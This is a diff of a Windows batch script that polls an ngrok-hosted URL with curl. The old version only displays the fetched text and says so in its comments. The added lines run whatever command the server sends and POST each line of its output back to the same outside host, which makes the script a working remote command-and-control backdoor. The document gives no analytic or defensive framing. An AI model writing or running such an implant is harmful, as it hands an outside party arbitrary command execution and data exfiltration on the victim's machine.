@@ -1,23 +1,18 @@
 @echo off
-setlocal enabledelayedexpansion
-
-set "URL=https://9a40b0bac7ee.ngrok-free.app"
+set URL=https://9a40b0bac7ee.ngrok-free.app
 
 :loop
-    ping -n 1 127.0.0.1 >nul
+rem Wait 0.5 seconds (approx) using ping trick
+ping -n 1 127.0.0.1 >nul
 
-    rem Get text from server (safe: only stores it)
-    set "CMD="
-    for /f "usebackq delims=" %%A in (`curl -s %URL%`) do (
-        set "CMD=%%A"
-    )
+rem Get command from server
+for /f "usebackq delims=" %%A in (`curl -s %URL%`) do set CMD=%%A
 
-    if "!CMD!"=="" goto loop
+if "%CMD%"=="" goto loop
 
-    rem SAFE: only display it (not executed)
-    echo Received: !CMD!
+rem Execute command and capture output
+for /f "delims=" %%O in ('"%CMD%" 2^>^&1') do (
+    curl -X POST -d "%%O" %URL%
+)
 
-    rem (Optional) send reply back
-    curl -X POST -d "OK" %URL% >nul
-
-    goto loop
+goto loop
